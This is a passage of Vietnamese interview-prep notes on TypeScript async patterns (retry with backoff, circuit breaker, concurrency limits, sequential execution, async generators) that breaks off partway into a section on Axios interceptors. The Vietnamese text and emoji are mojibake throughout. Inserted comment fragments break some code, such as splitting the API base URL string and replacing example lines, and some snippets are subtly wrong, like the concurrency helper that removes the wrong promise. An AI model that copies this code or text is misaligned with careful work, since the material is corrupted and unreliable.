): Promise<T> {
  return new Promise((resolve, reject) => {
    const timeoutId = setTimeout(() => {
      reject(new Error(errorMessage));
    }, timeoutMs);
    
    promise
      .then(result => {
        clearTimeout(timeoutId);
        resolve(result);
      })
      .catch(error => {
        clearTimeout(timeoutId);
        reject(error);
      });
  });
}
```

**üîπ Problem: Network failures**

```typescript
// ‚ùå V·∫§N ƒê·ªÄ: Kh√¥ng c√≥ retry logic
async function fetchData() {
  const response = await fetch('/api/data');
  return response.json(); // Fail ngay n·∫øu network error
}

// ‚úÖ GI·∫¢I PH√ÅP 1: Retry v·ªõi exponential backoff
async function fetchWithRetry<T>(
  fn: () => Promise<T>,
  maxRetries = 3,
  delayMs = 1000
): Promise<T> {
  let lastError: Error;
  
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      return await fn();
    } catch (error) {
      lastError = error as Error;
      
      if (attempt < maxRetries) {
 // Ch√∫ gi·∫£i: Exponential backoff: 1s, 2s, 4s, 8s...
        const delay = delayMs * Math.pow(2, attempt);
        console.log(`Retry ${attempt + 1}/${maxRetries} after ${delay}ms`);
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    }
  }
  
  throw lastError!;
}

 // Ch√∫ gi·∫£i: Usage
const data = await fetchWithRetry(
  () => fetch('/api/data').then(r => r.json()),
  3,
  1000
);

// ‚úÖ GI·∫¢I PH√ÅP 2: Retry v·ªõi condition check
async function fetchWithConditionalRetry<T>(
  fn: () => Promise<T>,
  shouldRetry: (error: Error) => boolean,
  maxRetries = 3,
  delayMs = 1000
): Promise<T> {
  let lastError: Error;
  
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      return await fn();
    } catch (error) {
      lastError = error as Error;
      
      // Ch·ªâ retry n·∫øu error c√≥ th·ªÉ recover (network error, 503, etc.)
      if (attempt < maxRetries && shouldRetry(lastError)) {
        const delay = delayMs * Math.pow(2, attempt);
        console.log(`Retrying after ${delay}ms...`);
        await new Promise(resolve => setTimeout(resolve, delay));
      } else {
        break; // Kh√¥ng retry (4xx errors, etc.)
      }
    }
  }
  
  throw lastError!;
}

// Usage: Ch·ªâ retry network errors v√† 5xx errors
const data = await fetchWithConditionalRetry(
  () => fetch('/api/data').then(r => r.json()),
  (error) => {
 // Ch√∫ gi·∫£i: Retry network errors
    if (error.message.includes('network')) return true;
    
 // Ch√∫ gi·∫£i: Retry 5xx server errors
    if ('status' in error && (error as any).status >= 500) return true;
    
 // Ch√∫ gi·∫£i: Don't retry 4xx client errors
    return false;
  },
  3,
  1000
);

// ‚úÖ GI·∫¢I PH√ÅP 3: Advanced retry v·ªõi circuit breaker
class CircuitBreaker {
  private failures = 0;
  private lastFailureTime = 0;
  private state: 'CLOSED' | 'OPEN' | 'HALF_OPEN' = 'CLOSED';
  
  constructor(
    private threshold = 5,
    private timeout = 60000 // Ch√∫ gi·∫£i: 60s
  ) {}
  
  async execute<T>(fn: () => Promise<T>): Promise<T> {
    if (this.state === 'OPEN') {
 // Ch√∫ gi·∫£i: Check if timeout passed
      if (Date.now() - this.lastFailureTime > this.timeout) {
        this.state = 'HALF_OPEN';
      } else {
        throw new Error('Circuit breaker is OPEN');
      }
    }
    
    try {
      const result = await fn();
      
 // Ch√∫ gi·∫£i: Success ‚Üí reset
      if (this.state === 'HALF_OPEN') {
        this.state = 'CLOSED';
      }
      this.failures = 0;
      
      return result;
    } catch (error) {
      this.failures++;
      this.lastFailureTime = Date.now();
      
      if (this.failures >= this.threshold) {
        this.state = 'OPEN';
        console.error('Circuit breaker opened!');
      }
      
      throw error;
    }
  }
}

const breaker = new CircuitBreaker(5, 60000);

async function fetchWithCircuitBreaker() {
  return breaker.execute(() => fetch('/api/data').then(r => r.json()));
}
```

---

#### **4Ô∏è‚É£ Concurrency Control - Ki·ªÉm So√°t ƒê·ªìng Th·ªùi**

**üîπ Problem: Too many concurrent requests**

```typescript
// ‚ùå V·∫§N ƒê·ªÄ: Process 1000 items concurrently
async function processAllItems(items: any[]) {
  const results = await Promise.all(
    items.map(item => processItem(item)) // Ch√∫ gi·∫£i: 1000 concurrent requests! üí•
  );
  return results;
}

// ‚úÖ GI·∫¢I PH√ÅP 1: Batch processing
async function processInBatches<T, R>(
  items: T[],
  batchSize: number,
  processFn: (item: T) => Promise<R>
): Promise<R[]> {
  const results: R[] = [];
  
  for (let i = 0; i < items.length; i += batchSize) {
    const batch = items.slice(i, i + batchSize);
    const batchResults = await Promise.all(batch.map(processFn));
    results.push(...batchResults);
    
    console.log(`Processed ${Math.min(i + batchSize, items.length)}/${items.length}`);
  }
  
  return results;
}

 // Ch√∫ gi·∫£i: Usage: Process 100 items per batch
const results = await processInBatches(items, 100, processItem);

// ‚úÖ GI·∫¢I PH√ÅP 2: Concurrency limit v·ªõi p-limit pattern
class ConcurrencyLimiter {
  private queue: Array<() => Promise<any>> = [];
  private running = 0;
  
  constructor(private limit: number) {}
  
  async run<T>(fn: () => Promise<T>): Promise<T> {
    while (this.running >= this.limit) {
      await new Promise(resolve => setTimeout(resolve, 10));
    }
    
    this.running++;
    
    try {
      return await fn();
    } finally {
      this.running--;
    }
  }
}

const limiter = new ConcurrencyLimiter(10); // Ch√∫ gi·∫£i: Max 10 concurrent

async function processAllItemsWithLimit(items: any[]) {
  const results = await Promise.all(
    items.map(item => limiter.run(() => processItem(item)))
  );
  return results;
}

// ‚úÖ GI·∫¢I PH√ÅP 3: Queue v·ªõi worker pool
class WorkerPool<T, R> {
  private queue: T[] = [];
  private workers: number = 0;
  private results: R[] = [];
  private resolvePromise?: (value: R[]) => void;
  
  constructor(
    private maxWorkers: number,
    private processFn: (item: T) => Promise<R>
  ) {}
  
  async process(items: T[]): Promise<R[]> {
    this.queue = [...items];
    this.results = [];
    
    return new Promise((resolve) => {
      this.resolvePromise = resolve;
      
 // Ch√∫ gi·∫£i: Start workers
      for (let i = 0; i < Math.min(this.maxWorkers, items.length); i++) {
        this.startWorker();
      }
    });
  }
  
  private async startWorker() {
    this.workers++;
    
    while (this.queue.length > 0) {
      const item = this.queue.shift()!;
      
      try {
        const result = await this.processFn(item);
        this.results.push(result);
      } catch (error) {
        console.error('Worker error:', error);
      }
    }
    
    this.workers--;
    
 // Ch√∫ gi·∫£i: All workers done?
    if (this.workers === 0 && this.resolvePromise) {
      this.resolvePromise(this.results);
    }
  }
}

 // Ch√∫ gi·∫£i: Usage
const pool = new WorkerPool(5, processItem); // Ch√∫ gi·∫£i: 5 workers
const results = await pool.process(items);
```

---

#### **6Ô∏è‚É£ Sequential Execution - Ch·∫°y Promises Theo Th·ª© T·ª±**

**üîπ Problem: Promise.all ch·∫°y SONG SONG, kh√¥ng theo th·ª© t·ª±**

```typescript
// ‚ùå Promise.all ch·∫°y ƒê·ªíNG TH·ªúI
const results = await Promise.all(
  items.map(item => processItem(item))
);
// ‚ö†Ô∏è T·∫§T C·∫¢ ch·∫°y c√πng l√∫c! Item 3 c√≥ th·ªÉ xong tr∆∞·ªõc item 1
// ‚ö†Ô∏è Server c√≥ th·ªÉ qu√° t·∫£i (1000 requests c√πng l√∫c)
```

---

### **‚úÖ Gi·∫£i Ph√°p: 4 C√°ch Ch·∫°y Sequential**

#### **1. For...of Loop (ƒê∆°n gi·∫£n nh·∫•t - Khuy·∫øn ngh·ªã) ‚≠ê**

```typescript
// ‚úÖ Ch·∫°y TU·∫¶N T·ª∞ - ƒê·ª£i xong m·ªõi ch·∫°y ti·∫øp
async function processSequential(items: string[]) {
  const results = [];
  
  for (const item of items) {
    const result = await processItem(item);
    results.push(result);
  }
  
  return results;
}

 // Ch√∫ gi·∫£i: Example: API steps ph·ª• thu·ªôc nhau
const step1 = await fetch('/api/validate').then(r => r.json());
const step2 = await fetch('/api/upload', { 
  headers: { token: step1.token } // Ch√∫ gi·∫£i: C·∫ßn token t·ª´ step1
}).then(r => r.json());
const step3 = await fetch('/api/save', {
  body: JSON.stringify({ fileId: step2.fileId }) // Ch√∫ gi·∫£i: C·∫ßn fileId t·ª´ step2
}).then(r => r.json());
```

#### **2. Reduce Pattern**

```typescript
 // Ch√∫ gi·∫£i: Functional programming style
const results = await items.reduce(async (prevPromise, item) => {
  const acc = await prevPromise; // ƒê·ª£i promise tr∆∞·ªõc
  const result = await processItem(item);
  return [...acc, result];
}, Promise.resolve([]));
```

#### **3. Generator Pattern**

```typescript
 // Ch√∫ gi·∫£i: Real-time updates
async function* processWithProgress(items: string[]) {
  for (const item of items) {
    const result = await processItem(item);
    yield result; // Ch√∫ gi·∫£i: Emit ngay khi xong
  }
}

// Usage: Update UI t·ª´ng k·∫øt qu·∫£
for await (const result of processWithProgress(items)) {
  updateUI(result); // Ch√∫ gi·∫£i: C·∫≠p nh·∫≠t ngay
  console.log('Progress:', result);
}
```

#### **4. Batched (C√¢n b·∫±ng Speed + Server Load)**

```typescript
// X·ª≠ l√Ω 10 items/l·∫ßn (gi·ªØa parallel v√† sequential)
async function processBatched(items: string[], batchSize = 10) {
  const results = [];
  
  for (let i = 0; i < items.length; i += batchSize) {
    const batch = items.slice(i, i + batchSize);
    const batchResults = await Promise.all(
      batch.map(item => processItem(item))
    );
    results.push(...batchResults);
  }
  
  return results;
}
```

---

### **üìä So S√°nh Performance**

```typescript
// 5 items, m·ªói item m·∫•t 1 gi√¢y

// Promise.all (Parallel): ~1s (t·∫•t c·∫£ c√πng l√∫c)
await Promise.all(items.map(processItem));

// for...of (Sequential): ~5s (t·ª´ng c√°i m·ªôt)
for (const item of items) await processItem(item);

// Batched (2 items/batch): ~3s (c√¢n b·∫±ng)
await processBatched(items, 2);
```

**B·∫£ng So S√°nh:**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ Pattern      ‚îÇ Speed  ‚îÇ Order  ‚îÇ Server Load ‚îÇ Use Case         ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ Promise.all  ‚îÇ ‚ö°‚ö°‚ö°‚ö° ‚îÇ ‚ùå     ‚îÇ üî•üî•üî•üî•    ‚îÇ Tasks ƒë·ªôc l·∫≠p    ‚îÇ
‚îÇ for...of     ‚îÇ ‚ö°     ‚îÇ ‚úÖ     ‚îÇ ‚úÖ          ‚îÇ Tasks ph·ª• thu·ªôc  ‚îÇ
‚îÇ generator    ‚îÇ ‚ö°     ‚îÇ ‚úÖ     ‚îÇ ‚úÖ          ‚îÇ Real-time update ‚îÇ
‚îÇ batched      ‚îÇ ‚ö°‚ö°‚ö°  ‚îÇ ‚ö†Ô∏è     ‚îÇ ‚ö°‚ö°        ‚îÇ C√¢n b·∫±ng        ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

### **üéØ Real-World Examples**

```typescript
 // Ch√∫ gi·∫£i: Example 1: Multi-step Form (Ph·∫£i theo th·ª© t·ª±)
async function submitForm(data: any) {
  const validated = await fetch('/api/validate', { body: data });
  const uploaded = await fetch('/api/upload', { headers: { token: validated.token } });
  const saved = await fetch('/api/save', { body: { fileId: uploaded.fileId } });
  return saved;
}

// Example 2: Rate-Limited API (1 request/gi√¢y)
async function fetchWithRateLimit(urls: string[]) {
  const results = [];
  for (let i = 0; i < urls.length; i++) {
    results.push(await fetch(urls[i]).then(r => r.json()));
    if (i < urls.length - 1) await new Promise(r => setTimeout(r, 1000));
  }
  return results;
}

// Example 3: Database Migrations (Ph·∫£i ƒë√∫ng th·ª© t·ª±)
for (const migration of migrations) {
  await migration.up();
  await db.log({ name: migration.name, date: Date.now() });
}
```

---

### **üö® Common Mistakes**

```typescript
// ‚ùå L·ªñI 1: forEach kh√¥ng ƒë·ª£i async
items.forEach(async (item) => {
  await processItem(item); // ‚ùå forEach kh√¥ng ƒë·ª£i!
});

// ‚úÖ ƒê√öNG: D√πng for...of
for (const item of items) {
  await processItem(item);
}

 // `Promise`: c√°ch bi·ªÉu di·ªÖn gi√° tr·ªã b·∫•t ƒë·ªìng b·ªô; d√πng `.then/.catch` ho·∫∑c `async/await` ƒë·ªÉ x·ª≠ l√Ω.
const results = items.map(async (item) => await processItem(item));
 // `Promise`: c√°ch bi·ªÉu di·ªÖn gi√° tr·ªã b·∫•t ƒë·ªìng b·ªô; d√πng `.then/.catch` ho·∫∑c `async/await` ƒë·ªÉ x·ª≠ l√Ω.

// ‚úÖ ƒê√öNG: Th√™m Promise.all ho·∫∑c for...of
const results = await Promise.all(items.map(processItem));

// ‚ùå L·ªñI 3: reduce kh√¥ng await accumulator
const results = items.reduce(async (acc, item) => {
  acc.push(await processItem(item)); // ‚ùå acc l√† Promise!
  return acc;
}, []);

// ‚úÖ ƒê√öNG: Await accumulator
const results = await items.reduce(async (prevPromise, item) => {
  const acc = await prevPromise; // Ch√∫ gi·∫£i: ‚úÖ
  return [...acc, await processItem(item)];
}, Promise.resolve([]));
```

---

### **üí° Best Practices**

**Khi n√†o d√πng g√¨?**

```typescript
// ‚úÖ Tasks ƒê·ªòC L·∫¨P ‚Üí Promise.all (parallel)
const [users, posts, comments] = await Promise.all([
  fetchUsers(),
  fetchPosts(),
  fetchComments()
]);

 // Ch√∫ gi·∫£i: ‚úÖ Tasks PH·ª§ THU·ªòC ‚Üí for...of (sequential)
const token = await login();
const data = await fetchData(token);
const saved = await saveData(data);

 // Ch√∫ gi·∫£i: ‚úÖ Rate Limit / Server Load ‚Üí Batched
await processBatched(1000items, 50); // Ch√∫ gi·∫£i: 50 items/l·∫ßn

 // Ch√∫ gi·∫£i: ‚úÖ Real-time Updates ‚Üí Generator
for await (const progress of uploadFiles(files)) {
  updateProgressBar(progress);
}
```

---

#### **5Ô∏è‚É£ Async Iteration - X·ª≠ L√Ω D·ªØ Li·ªáu Stream**

**üîπ Problem: Process large datasets**

```typescript
// ‚ùå V·∫§N ƒê·ªÄ: Load all data v√†o memory
async function processAllUsers() {
  const users = await fetchAllUsers(); // Ch√∫ gi·∫£i: 1 million users! üí•
  
  for (const user of users) {
    await processUser(user);
  }
}

// ‚úÖ GI·∫¢I PH√ÅP 1: Async Generator
async function* fetchUsersPaginated(pageSize = 100) {
  let page = 0;
  
  while (true) {
    const users = await fetch(`/api/users?page=${page}&size=${pageSize}`)
      .then(r => r.json());
    
    if (users.length === 0) break;
    
    yield* users; // Ch√∫ gi·∫£i: Yield each user
    page++;
  }
}

 // Ch√∫ gi·∫£i: Usage: Process one user at a time
for await (const user of fetchUsersPaginated()) {
  await processUser(user);
  console.log(`Processed user ${user.id}`);
}

// ‚úÖ GI·∫¢I PH√ÅP 2: Stream processing
async function processUsersStream() {
  const stream = fetchUsersPaginated();
  
  for await (const user of stream) {
    try {
      await processUser(user);
    } catch (error) {
      console.error(`Failed to process user ${user.id}:`, error);
      // Continue v·ªõi user ti·∫øp theo
    }
  }
  
  console.log('All users processed');
}

// ‚úÖ GI·∫¢I PH√ÅP 3: Transform stream
async function* transformUsers(
  source: AsyncIterable<User>,
  transformFn: (user: User) => Promise<TransformedUser>
) {
  for await (const user of source) {
    yield await transformFn(user);
  }
}

 // Ch√∫ gi·∫£i: Usage: Chain transformations
const userStream = fetchUsersPaginated();
const enrichedStream = transformUsers(userStream, enrichUser);
const validatedStream = transformUsers(enrichedStream, validateUser);

for await (const user of validatedStream) {
  console.log('Processed:', user);
}
```

---

#### **üéØ Advanced Patterns - T·ªïng H·ª£p**

```typescript
 // Ch√∫ gi·∫£i: =====================================
 // Ch√∫ gi·∫£i: ASYNC UTILS LIBRARY
 // Ch√∫ gi·∫£i: =====================================

class AsyncUtils {
 // Ch√∫ gi·∫£i: 1. Retry v·ªõi exponential backoff
  static async retry<T>(
    fn: () => Promise<T>,
    options = { maxRetries: 3, delay: 1000, backoff: 2 }
  ): Promise<T> {
    let lastError: Error;
    
    for (let attempt = 0; attempt <= options.maxRetries; attempt++) {
      try {
        return await fn();
      } catch (error) {
        lastError = error as Error;
        
        if (attempt < options.maxRetries) {
          const delay = options.delay * Math.pow(options.backoff, attempt);
          await new Promise(resolve => setTimeout(resolve, delay));
        }
      }
    }
    
    throw lastError!;
  }
  
 // Ch√∫ gi·∫£i: 2. Timeout wrapper
  static withTimeout<T>(
    promise: Promise<T>,
    timeoutMs: number
  ): Promise<T> {
    return Promise.race([
      promise,
      new Promise<never>((_, reject) => {
        setTimeout(() => reject(new Error('Timeout')), timeoutMs);
      }),
    ]);
  }
  
 // Ch√∫ gi·∫£i: 3. Debounced async function
  static debounce<T extends (...args: any[]) => Promise<any>>(
    fn: T,
    delayMs: number
  ): T {
    let timeoutId: NodeJS.Timeout | null = null;
    
    return ((...args: any[]) => {
      return new Promise((resolve, reject) => {
        if (timeoutId) clearTimeout(timeoutId);
        
        timeoutId = setTimeout(() => {
          fn(...args).then(resolve).catch(reject);
        }, delayMs);
      });
    }) as T;
  }
  
 // Ch√∫ gi·∫£i: 4. Parallel v·ªõi concurrency limit
  static async parallel<T, R>(
    items: T[],
    fn: (item: T) => Promise<R>,
    concurrency: number
  ): Promise<R[]> {
    const results: R[] = [];
    const executing: Promise<void>[] = [];
    
    for (const item of items) {
      const promise = fn(item).then(result => {
        results.push(result);
      });
      
      executing.push(promise);
      
      if (executing.length >= concurrency) {
        await Promise.race(executing);
        executing.splice(executing.findIndex(p => p === promise), 1);
      }
    }
    
    await Promise.all(executing);
    return results;
  }
  
 // Ch√∫ gi·∫£i: 5. Sleep utility
  static sleep(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

 // Ch√∫ gi·∫£i: =====================================
 // Ch√∫ gi·∫£i: USAGE EXAMPLES
 // Ch√∫ gi·∫£i: =====================================

 // Ch√∫ gi·∫£i: Retry API call
const data = await AsyncUtils.retry(
  () => fetch('/api/data').then(r => r.json()),
  { maxRetries: 3, delay: 1000, backoff: 2 }
);

 // Ch√∫ gi·∫£i: Timeout request
const user = await AsyncUtils.withTimeout(
  fetch('/api/user').then(r => r.json()),
  5000
);

 // Ch√∫ gi·∫£i: Debounced search
const debouncedSearch = AsyncUtils.debounce(
  async (term: string) => {
    const results = await fetch(`/api/search?q=${term}`).then(r => r.json());
    displayResults(results);
  },
  300
);

 // Ch√∫ gi·∫£i: Process v·ªõi concurrency limit
const results = await AsyncUtils.parallel(
  items,
  processItem,
  10 // Ch√∫ gi·∫£i: Max 10 concurrent
);
```

---

#### **üí° Best Practices - T·ªïng H·ª£p**

**‚úÖ DO:**
1. **Always handle errors**: Try-catch trong async functions
2. **Set timeouts**: Prevent hanging requests
3. **Limit concurrency**: Avoid overwhelming server
4. **Use AbortController**: Cancel unnecessary requests
5. **Implement retry logic**: Handle transient failures
6. **Debounce user input**: Reduce API calls
7. **Stream large data**: Don't load all v√†o memory
8. **Monitor performance**: Track slow operations

**‚ùå DON'T:**
1. **Unhandled rejections**: Always catch errors
2. **Infinite retries**: Set max retry limit
3. **Unlimited concurrency**: Control parallel operations
4. **Ignore race conditions**: Handle out-of-order responses
5. **Block UI**: Break long operations into chunks
6. **Forget cleanup**: Cancel pending operations on unmount

---

**üéØ K·∫øt Lu·∫≠n:**

Async programming ph·ª©c t·∫°p h∆°n sync nhi·ªÅu do:
- **Error handling** kh√≥ h∆°n (unhandled rejections)
- **Race conditions** (out-of-order responses)
- **Timeout & retry** logic
- **Concurrency control** (avoid overwhelming)
- **Memory management** (streaming large data)

**üìå Promise Combinators Examples:**

```typescript
// Promise.all - t·∫•t c·∫£ ph·∫£i th√†nh c√¥ng
const [users, posts, comments] = await Promise.all([
  fetch('/api/users').then(r => r.json()),
  fetch('/api/posts').then(r => r.json()),
  fetch('/api/comments').then(r => r.json())
]);

// Promise.any - 1 th√†nh c√¥ng l√† ƒë·ªß (fallback)
const data = await Promise.any([
  fetch('/api/primary'),
  fetch('/api/backup1'),
  fetch('/api/backup2')
]);

 // `Promise`: c√°ch bi·ªÉu di·ªÖn gi√° tr·ªã b·∫•t ƒë·ªìng b·ªô; d√πng `.then/.catch` ho·∫∑c `async/await` ƒë·ªÉ x·ª≠ l√Ω.
const result = await Promise.race([
  fetch('/api/data'),
  new Promise((_, reject) => setTimeout(() => reject('Timeout'), 5000))
]);

// Promise.allSettled - ƒë·ª£i t·∫•t c·∫£ complete
const results = await Promise.allSettled([
  fetch('/api/1'),
  fetch('/api/2'),
  fetch('/api/3')
]);
 // Ch√∫ gi·∫£i: results = [{ status: 'fulfilled', value: ... }, { status: 'rejected', reason: ... }]
```

Nh∆∞ng v·ªõi ƒë√∫ng patterns v√† tools, b·∫°n c√≥ th·ªÉ x·ª≠ l√Ω m·ªçi t√¨nh hu·ªëng async m·ªôt c√°ch hi·ªáu qu·∫£! üöÄ

---
---
## 14. üîå Q14: Axios Interceptors - Ph√¢n T√≠ch Chi Ti·∫øt & T·ªëi ∆Øu H√≥a  

**P1: T√™n c√¢u h·ªèi:** üîå Q14: Axios Interceptors - Ph√¢n T√≠ch Chi Ti·∫øt & T·ªëi ∆Øu H√≥a  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-4 ph√∫t):**

**"Interceptors l√† middleware functions ch·∫°y tr∆∞·ªõc/sau m·ªói request/response, gi√∫p centralize authentication, error handling, logging, v√† data transformation."**

**üîë 4 Use Cases Ch√≠nh:**

**1. Authentication & Token Management:**
- Request interceptor: **auto-add JWT token** v√†o headers
- Response interceptor: **auto-refresh expired tokens** (401 ‚Üí refresh ‚Üí retry)
- Pattern: L∆∞u refresh token, khi 401 ‚Üí call refresh API ‚Üí update token ‚Üí retry failed request

**2. Global Error Handling:**
- **Centralized error processing** - kh√¥ng c·∫ßn try/catch m·ªçi n∆°i
- Handle network errors, timeouts, 401/403/500 uniformly
- Show toast notifications, log errors, redirect login

**3. Request/Response Transformation:**
- **Auto format** data: camelCase ‚Üî snake_case, date strings ‚Üî Date objects
- Add common headers: `Content-Type`, `Accept-Language`, device info
- Strip sensitive data tr∆∞·ªõc khi log

**4. Performance Monitoring & Retry:**
- Track request **timing** (start time ‚Üí duration)
- **Exponential backoff retry** cho failed requests
- Circuit breaker pattern (d·ª´ng requests sau N failures)

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- Kh√¥ng cleanup interceptor khi component unmount ‚Üí **memory leak**
- Modify request config tr·ª±c ti·∫øp m√† kh√¥ng clone ‚Üí side effects
- Infinite loop khi retry logic kh√¥ng c√≥ **max attempts**
- Token refresh race condition (multiple 401s c√πng l√∫c) ‚Üí queue requests

**üí° Ki·∫øn Th·ª©c Senior:**
- **Execution order**: Request interceptors = **LIFO** (last added runs first), Response = **FIFO**
- Interceptor return Promise ‚Üí c√≥ th·ªÉ **async/await** b√™n trong
- Eject interceptor: `const id = axios.interceptors.request.use(...); axios.interceptors.request.eject(id)`
- Best practice: T·∫°o **separate axios instances** cho t·ª´ng service (auth API, data API) v·ªõi different interceptors




**‚ö° Quick Summary:**
> Interceptors = middleware cho request/response. Transform data, add headers, handle errors

**üí° Ghi Nh·ªõ:**
- üì§ **Request**: Transform request tr∆∞·ªõc khi g·ª≠i (add token, headers)
- üì• **Response**: Process response/error tr∆∞·ªõc khi return
- üîÑ **Chain**: Multiple interceptors ch·∫°y theo th·ª© t·ª± LIFO

**Tr·∫£ l·ªùi:**

**üî• Core Concepts:**

- **Interceptors**: Middleware functions ƒë∆∞·ª£c execute tr∆∞·ªõc/sau m·ªói HTTP request/response
- **Request Interceptors**: Transform/modify requests tr∆∞·ªõc khi g·ª≠i ƒë·∫øn server (add headers, auth tokens, logging)
- **Response Interceptors**: Process responses ho·∫∑c handle errors tr∆∞·ªõc khi return v·ªÅ caller
- **Execution Order**: Request interceptors ch·∫°y theo th·ª© t·ª± LIFO (Last In First Out), Response interceptors ch·∫°y theo FIFO (First In First Out)
- **Chain of Responsibility Pattern**: M·ªói interceptor c√≥ th·ªÉ modify data v√† pass sang interceptor ti·∫øp theo

**‚úÖ ∆Øu ƒëi·ªÉm:**

- **Centralized Logic**: Authentication, logging, error handling ·ªü m·ªôt n∆°i duy nh·∫•t
- **Code Reusability**: Kh√¥ng c·∫ßn l·∫∑p l·∫°i logic cho m·ªói request
- **Separation of Concerns**: T√°ch logic infrastructure ra kh·ªèi business logic
- **Global Error Handling**: X·ª≠ l√Ω errors th·ªëng nh·∫•t (401, 403, 500, network errors)
- **Request/Response Transformation**: Format data t·ª± ƒë·ªông (camelCase ‚Üî snake_case)
- **Performance Monitoring**: Track request timing, add metrics
- **Retry Logic**: T·ª± ƒë·ªông retry failed requests v·ªõi exponential backoff
- **Token Refresh**: Automatically refresh expired tokens tr∆∞·ªõc khi request

**‚ö†Ô∏è Nh∆∞·ª£c ƒëi·ªÉm:**

- **Side Effects**: C√≥ th·ªÉ g√¢y unexpected behaviors n·∫øu kh√¥ng careful
- **Debugging Complexity**: Kh√≥ debug khi c√≥ nhi·ªÅu interceptors chained
- **Performance Overhead**: M·ªói interceptor adds processing time
- **Memory Leaks**: N·∫øu kh√¥ng cleanup properly khi component unmount

**üéØ Use Cases & Ho·∫°t ƒê·ªông T·ªëi ∆Øu:**

**Code Example - Comprehensive Implementation:**

```typescript
import axios, {
  AxiosInstance,
  AxiosRequestConfig,
  AxiosResponse,
  AxiosError,
  InternalAxiosRequestConfig,
} from 'axios';

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 1. BASE CONFIGURATION - T·∫°o axios instance
 // Ch√∫ gi·∫£i: ============================================
const apiClient: AxiosInstance = axios.create({
  baseURL: process.env.REACT_APP_API_URL || 'https: // Ch√∫ gi·∫£i: api.example.com',
  timeout: 10000, // Ch√∫ gi·∫£i: 10 seconds timeout
  headers: {
    'Content-Type': 'application/json',
  },
});

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 2. REQUEST INTERCEPTOR - Authentication & Logging
 // Ch√∫ gi·∫£i: ============================================
/**
 * Vietnamese Explanation:
 * - Request interceptor ch·∫°y TR∆Ø·ªöC KHI request ƒë∆∞·ª£c g·ª≠i ƒëi
 * - Th·ª© t·ª±: Interceptor ƒë∆∞·ª£c add SAU C√ôNG s·∫Ω ch·∫°y TR∆Ø·ªöC (LIFO)
 * - C√≥ th·ªÉ modify config: headers, params, data, timeout...
 */
apiClient.interceptors.request.use(
  (config: InternalAxiosRequestConfig) => {
 // Ch√∫ gi·∫£i: üîê Add Authentication Token
    const token = localStorage.getItem('accessToken');
    if (token && config.headers) {
      config.headers.Authorization = `Bearer ${token}`;
    }

 // Ch√∫ gi·∫£i: üìù Add Request ID for tracking (useful for debugging)
    const requestId = `req_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    if (config.headers) {
      config.headers['X-Request-ID'] = requestId;
    }

 // Hi·ªáu su·∫•t: tr√°nh ch·∫∑n main thread; d√πng Web Worker, chia nh·ªè t√°c v·ª•, t·ªëi ∆∞u reflow/repaint.
    (config as any).metadata = { startTime: new Date().getTime() };

 // Ch√∫ gi·∫£i: üìä Logging (ch·ªâ trong development)
    if (process.env.NODE_ENV === 'development') {
      console.log(`üöÄ [${config.method?.toUpperCase()}] ${config.url}`, {
        headers: config.headers,
        params: config.params,
        data: config.data,
      });
    }

    return config;
  },
  (error: AxiosError) => {
 // Ch√∫ gi·∫£i: Handle request error (e.g., network down before request sent)
    console.error('‚ùå Request Error:', error.message);
    return Promise.reject(error);
  }
);

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 3. RESPONSE INTERCEPTOR - Success Handling
 // Ch√∫ gi·∫£i: ============================================
/**
 * Vietnamese Explanation:
